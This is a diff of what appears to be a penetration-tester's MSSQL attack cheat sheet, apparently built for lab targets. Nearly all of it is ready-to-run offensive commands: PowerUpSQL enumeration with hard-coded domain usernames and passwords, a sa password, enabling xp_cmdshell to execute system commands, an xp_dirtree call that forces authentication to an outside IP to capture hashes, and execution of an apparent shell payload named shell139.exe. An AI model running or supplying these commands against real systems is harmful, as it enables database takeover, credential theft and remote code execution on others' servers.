@@ -13,10 +13,10 @@ nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config
 ```bash
 Import-Module .\PowerUpSQL.ps1
 Get-SQLInstanceDomain
-Invoke-SQLDumpInfo -Username nagoya-industries.com\svc_mssql -password Nagoya2023 -Verbose
-Get-SQLInstanceLocal -Username nagoya-industries.com\svc_mssql -password Nagoya2023 -Verbose
+Invoke-SQLDumpInfo -Username flight\c.bum -password Tikkycoll_431012284 -Verbose
+Get-SQLInstanceLocal -Username flight\c.bum -password Tikkycoll_431012284 -Verbose
 Invoke-SQLAudit -Verbose -Instance SQLServer1
-Invoke-SQLAudit -Username nagoya-industries.com\svc_mssql -password Nagoya2023 -Verbose
+Invoke-SQLAudit -Username flight\c.bum -password Tikkycoll_431012284 -Verbose
 sqlcmd.exe -S nagoya.nagoya-industries.com -U administrator -Q "EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
 Get-SQLInstanceDomain -Verbose -DomainAccount svc_mssql
 sqlcmd.exe -Q "use master; exec xp_dirtree '\\192.168.45.221\share\test'" -S nagoya.nagoya-industries.com`
@@ -173,6 +173,6 @@ sqlcmd -U sa -P DeathMarchPac1942 -Q "use umbraco; select * from umbraco..cmsMem
 sqlcmd -U sa -P DeathMarchPac1942 -Q "use umbraco; select * from umbraco..sysobjects"umbracoUserLogin umbracoUser umbracoUserGroup
 
 .\sqlcmd.exe -Q "exec xp_cmdshell 'whoami'"
-.\sqlcmd.exe -Q "use msdb; EXEC SP_CONFIGURE 'xp_cmdshell' , 1; exec xp_cmdshell 'whoami'"
+.\sqlcmd -Q "use master; EXEC SP_CONFIGURE 'xp_cmdshell' , 1; exec xp_cmdshell 'whoami'"
 sqlcmd -Q "use msdb; exec xp_cmdshell 'whoami'"
 sqlcmd.exe -Q "use msdb; EXEC SP_CONFIGURE 'xp_cmdshell' , 1; exec xp_cmdshell 'C:\Users\Christopher.Lewis\Documents\shell139.exe'"
